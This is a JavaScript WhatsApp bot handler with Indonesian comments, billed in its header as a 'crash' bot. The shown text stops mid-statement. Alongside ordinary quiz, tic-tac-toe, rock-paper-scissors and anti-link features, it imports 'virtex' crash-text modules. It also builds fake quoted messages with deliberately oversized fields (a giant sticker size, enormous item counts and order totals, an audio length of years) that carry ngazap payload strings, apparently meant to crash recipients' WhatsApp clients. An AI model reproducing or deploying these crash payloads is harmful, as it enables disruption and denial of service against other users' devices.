/**
   MY 𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘
*/

require('./hwkal')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const os = require('os')
const { ngazap } = require('./virtex/ngazap')
const { buttonvirus } = require('./virtex/buttonvirus')
const { cttl } = require('./virtex/cttl')
const { bd } = require('./virtex/bd')
const { ft } = require('./virtex/ft')
const { place } = require('./virtex/place')
const { url } = require('./virtex/url')
const hx = require('hxz-api')
const mel = require('kitsune-api')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const google = require('google-it')
const primbon = new Primbon()
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,  Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
//=================================================//
const kalimage = fs.readFileSync ('./lib/hwmodsgans.jpg')
const thumbnail = fs.readFileSync ('./lib/mamak.jpg')
const { mediafireDl } = require('./lib/mediafire.js')
//=================================================//
// KHUSUS APIKEY KALAU MAU DI AKTIFKAN HUB : Wa.me/6281991410940
/*const setting = JSON.parse(fs.readFileSync('./OrderApikey/apikey.json'))z*/
//=================================================//
// Function
const cerpen = require('./lib/cerpen')
const  { ind } = require(`./baseikal`)
lang = ind // baseikal
typemenu = 'image'
wm = 'ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ'
//=================================================//
// read database
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
let vote = db.data.others.vote = []
const banned = JSON.parse(fs.readFileSync('./database/banned.json'))
//=================================================//
// Date
moment.tz.setDefault("Asia/Jakarta").locale("id");
//=================================================//
module.exports = haikal = async (haikal, m, chatUpdate, store) => {
 try {
 var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
//=================================================//
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await haikal.decodeJid(haikal.user.id)
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const isBan = banned.includes(m.sender)
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const from = mek.key.remoteJid
//=================================================//
// Group
const groupMetadata = m.isGroup ? await haikal.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
//=================================================//
//=================================================//
  // Random Image Simple Menu
let picaks = [flaming,fluming,flarun,flasmurf]
let picak = picaks[Math.floor(Math.random() * picaks.length)]
//=================================================//
const hw = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6283844775996@s.whatsapp.net" } : {}) 
},
"message": {
"extendedTextMessage": {
"text": "ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ",
"previewType": "NONE",
"contextInfo": {
"stanzaId": "3EB0382EDBB2",
"participant": "6283844775996@s.whatsapp.net"
	}}}}	
//=================================================//	
const kal = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"extendedTextMessage": {
"text": "ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ",
"previewType": "NONE",
"contextInfo": {
"stanzaId": "3EB0382EDBB2",
"participant": "@s.whatsapp.net"
	}}}}	
//=================================================//	
const kel = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/ApPRbzvidZuNpHcHsCn2P1rVHawvt2T63DCZMyWnAgQZ.enc",
"fileSha256": "czwy7lIUZuU8GL9W2UP3sSo/vy9FlETMpqpQneQQ+w8=",
"fileEncSha256": "xOjP90WLzICVTQQvj7Ts+oJvcxhas5oOEPMvoqKVQ1E=",
"mediaKey": "/j2BjzjS/e88MHVCcaS8f3kaSCAVe18Nv4tQb/rZtrc=",
"mimetype": "image/webp",
"directPath": "/v/t62.7118-24/25076345_285509236738530_1931711252260953768_n.enc?ccb=11-4&oh=f6ef4b023e7424d5d2c4d03923c0ab1b&oe=616F03EF",
"height": 150000,
"width": 150000,
"fileLength": "10124",
"mediaKeyTimestamp": "1632147575",
"isAnimated": false
	}}}
	const doc = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"documentMessage": {
							"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
							"mimetype": "application/pdf",
							"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
							"fileLength": "64455",
							"pageCount": 1,
							"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
							"fileName": `'ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ'${ngazap(prefix)}`,
							"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
	}}}
	const trol = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"orderMessage": {
						"orderId": "594071395007984",
						"thumbnail": fs.readFileSync('./lib/pict.jpg'),
						"itemCount": 100000000000,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": "",
						"orderTitle": "ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ",
						"sellerJid": "6283844775996@s.whatsapp.net",
						"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
						"totalAmount1000": "500000000000000",
						"totalCurrencyCode": "IDR"
	}}}
//=================================================//
const bangkal= (teks) => {
haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `𝒀𝑶𝑺𝑶𝑲𝑨𝑵𝑬𝑺𝑰𝑨`,"body": `🔥🔥🔥 ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://youtube.com/c/YosokaNesia`}}}, { quoted: hw })
} 
//=================================================//
// Kontak
 const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
const bacito = (jid, text, quoted = fkontak) => haikal.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./lib/pict.jpg'), sourceUrl: `https://youtube.com/c/TheZyrenn` }}}, { quoted })
//=================================================//
//GCLINK
const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6283844775996-1616169743@g.us","inviteCode": "m","groupName": "P", "caption": `© ${ownername}`, 'jpegThumbnail': thumb}}}
const bacit = (jid, text, quoted = fgclink) => haikal.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ𝐘 ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./lib/pict.jpg'), sourceUrl: `https://youtube.com/c/TheZyrenn` }}}, { quoted })
//=================================================//
//Document
const fdoc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
const bacot = (jid, text, quoted = fdoc) => haikal.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./lib/pict.jpg'), sourceUrl: `https://youtube.com/c/TheZyrenn` }}}, { quoted })
//=================================================//
// VN 
const fvn = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@g.us" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
const hwbro = (jid, text, quoted = fvn) => haikal.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./lib/pict.jpg'), sourceUrl: `https://youtube.com/c/TheZyrenn` }}}, { quoted })
//=================================================//
//Lokasi
const floc = {key : {participant : '0@s.whatsapp.net'},message: {locationMessage: {name: `${ownername}`,jpegThumbnail: thumb}}}
const hwmods = (jid, text, quoted = floc) => haikal.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./lib/pict.jpg'), sourceUrl: `https://youtube.com/c/TheZyrenn` }}}, { quoted })
//=================================================//
//Troli
const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "@g.us"}, "message": {orderMessage: {itemCount: 2021,status: 200, thumbnail: thumb, surface: 200, message: `© ${ownername}`, orderTitle: 'memek', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
const review = (jid, text, quoted = ftroli) => haikal.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./lib/pict.jpg'), sourceUrl: `https://youtube.com/c/TheZyrenn` }}}, { quoted })
//=================================================//
//image
const cayalog = { "key": { "fromMe": false, "participant": "0@s.whatsapp.net", "remoteJid": "@s.whatsapp.net"},"message": { "orderMessage": { "itemCount": 0, "surface": 'CATALOG' }}}
const reply = (jid, text, quoted = cayalog) => haikal.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./lib/pict.jpg'), sourceUrl: `https://youtube.com/c/TheZyrenn` }}}, { quoted })

//=================================================//
// Time & Date
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam'
}
if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Petang'
 }
if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore'
 }
if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang'
 }
if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi'
 }
if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Malam'
 }
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const wita = moment(Date.now()).tz('Asia/Makassar').locale('id').format('HH:mm:ss z')
const wit = moment(Date.now()).tz('Asia/Jayapura').locale('id').format('HH:mm:ss z')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')

//=================================================//
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
let chats = global.db.data.chats[m.chat]
if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
if (chats) {
if (!('mute' in chats)) chats.mute = false
if (!('antilink' in chats)) chats.antilink = false
} else global.db.data.chats[m.chat] = {
mute: false,
antilink: false,
}
let setting = global.db.data.settings[botNumber]
if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
if (setting) {
if (!isNumber(setting.status)) setting.status = 0
if (!('autobio' in setting)) setting.autobio = false
if (!('templateImage' in setting)) setting.templateImage = true
if (!('templateVideo' in setting)) setting.templateVideo = false
if (!('templateGif' in setting)) setting.templateGif = false
if (!('templateMsg' in setting)) setting.templateMsg = false
} else global.db.data.settings[botNumber] = {
status: 0,
autobio: false,
templateImage: true,
templateVideo: false,
templateGif: false,
templateMsg: false,
}

} catch (err) {
console.error(err)
}

//=================================================//
// Public & Self
if (!haikal.public) {
if (!m.key.fromMe) return
}
const ftrolii ={key: {fromMe: false,
"participant":"0@s.whatsapp.net", 
"remoteJid": "@g.us"},
"message": {orderMessage: 
{itemCount: 100000000000,
status: 200, 
thumbnail: kalimage, 
surface: 200, 
message: `© ${ownername}`,
token: "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
totalAmount1000: "500000000000000",
totalCurrencyCode: "IDR",
orderTitle: `ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ ${ngazap(prefix)}`,
sellerJid: '0@s.whatsapp.net'}}, 
contextInfo: {"forwardingScore":999,"isForwarded":true},
sendEphemeral: true}
//=================================================//
// reset limit every 12 hours
let cron = require('node-cron')
cron.schedule('00 12 * * *', () => {
let user = Object.keys(global.db.data.users)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
for (let jid of user) global.db.data.users[jid].limit = limitUser
console.log('Reseted Limit')
}, {
scheduled: true,
timezone: "Asia/Jakarta"
})

//=================================================//
// auto set bio
if (db.data.settings[botNumber].autobio) {
let setting = global.db.data.settings[botNumber]
if (new Date() * 1 - setting.status > 1000) {
let uptime = await runtime(process.uptime())
await haikal.setStatus(`${haikal.user.name} | Runtime : ${runtime(uptime)}`)
setting.status = new Date() * 1
}
}
//=================================================//
// Mute Chat
if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
return
}
//=================================================//
  // Anti Link
if (db.data.chats[m.chat].antilink) {
if (budy.match(`chat.whatsapp.com`)) {
bangkal(`「 ANTI LINK 」\n\nKamu terdeteksi mengirim link group, maaf kamu akan di kick !`)
if (!isBotAdmins) return bangkal(`Ehh bot gak admin T_T`)
let gclink = (`https://chat.whatsapp.com/`+await haikal.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return bangkal(`Ehh maaf gak jadi, karena kamu ngirim link group ini`)
if (isAdmins) return bangkal(`Ehh maaf kamu admin`)
if (isCreator) return bangkal(`Ehh maaf kamu owner bot ku`)
haikal.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}
//=================================================//
  // Mute Chat
  if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
  return
  }  
//=================================================//
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
userJid: haikal.user.id,
quoted: hw.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, haikal.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
haikal.ev.emit('messages.upsert', msg)
}
if (('family100'+m.chat in _family100) && isCmd) {
kuis = true
let room = _family100['family100'+m.chat]
let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
if (!isSurender) {
let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
if (room.terjawab[index]) return !0
room.terjawab[index] = m.sender
}
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
}).filter(v => v).join('\n')}
${isSurender ? '' : `Perfect Player`}`.trim()
haikal.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
if (isWin || isSurender) delete _family100['family100'+m.chat]
}
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await haikal.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, haikal.user.name, m)
delete tebaklagu[m.sender.split('@')[0]]
} else bangkal('*Jawaban Salah!*')
}
if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = kuismath[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await bangkal(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
delete kuismath[m.sender.split('@')[0]]
} else bangkal('*Jawaban Salah!*')
}
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakgambar[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await haikal.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, haikal.user.name, m)
delete tebakgambar[m.sender.split('@')[0]]
} else bangkal('*Jawaban Salah!*')
}
if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkata[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await haikal.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, haikal.user.name, m)
delete tebakkata[m.sender.split('@')[0]]
} else bangkal('*Jawaban Salah!*')
}
if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = caklontong[m.sender.split('@')[0]]
deskripsi = caklontong_desk[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await haikal.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n*${deskripsi}*\n\nIngin bermain lagi? tekan button dibawah`, haikal.user.name, m)
delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
} else bangkal('*Jawaban Salah!*')
}
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await haikal.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, haikal.user.name, m)
delete tebakkalimat[m.sender.split('@')[0]]
} else bangkal('*Jawaban Salah!*')
}
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklirik[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await haikal.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, haikal.user.name, m)
delete tebaklirik[m.sender.split('@')[0]]
} else bangkal('*Jawaban Salah!*')
}
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await haikal.sendButtonText(m.chat, [{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, haikal.user.name, m)
delete tebaktebakan[m.sender.split('@')[0]]
} else bangkal('*Jawaban Salah!*')
}
//=================================================//
//TicTacToe
this.game = this.game ? this.game : {}
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
if (room) {
let ok
let isWin = !1
let isTie = !1
let isSurrender = !1
//=================================================//
// bangkal(`[DEBUG]\n${parseInt(m.text)}`)
if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
isSurrender = !/^[1-9]$/.test(m.text)
if (m.sender !== room.game.currentTurn) { // nek wayahku
if (!isSurrender) return !0
}
if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
bangkal({
'-3': 'Game telah berakhir',
'-2': 'Invalid',
'-1': 'Posisi Invalid',
0: 'Posisi Invalid',
}[ok])
return !0
}
if (m.sender === room.game.winner) isWin = true
else if (room.game.board === 511) isTie = true
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
if (isSurrender) {
room.game._currentTurn = m.sender === room.game.playerX
isWin = true
}
let winner = isSurrender ? room.game.currentTurn : room.game.winner
let str = `Room ID: ${room.id}
${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}
${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
if (room.x !== room.o) await haikal.sendText(room.x, str, m, { mentions: parseMention(str) } )
await haikal.sendText(room.o, str, m, { mentions: parseMention(str) } )
if (isTie || isWin) {
delete this.game[room.id]
}
}
//=================================================//
//Suit PvP
this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
haikal.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
delete this.suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = m.chat
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
haikal.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
if (!roof.pilih) haikal.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
if (!roof.pilih2) haikal.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) haikal.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
haikal.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
bangkal(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih2) haikal.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
bangkal(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) haikal.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
let stage = roof.pilih
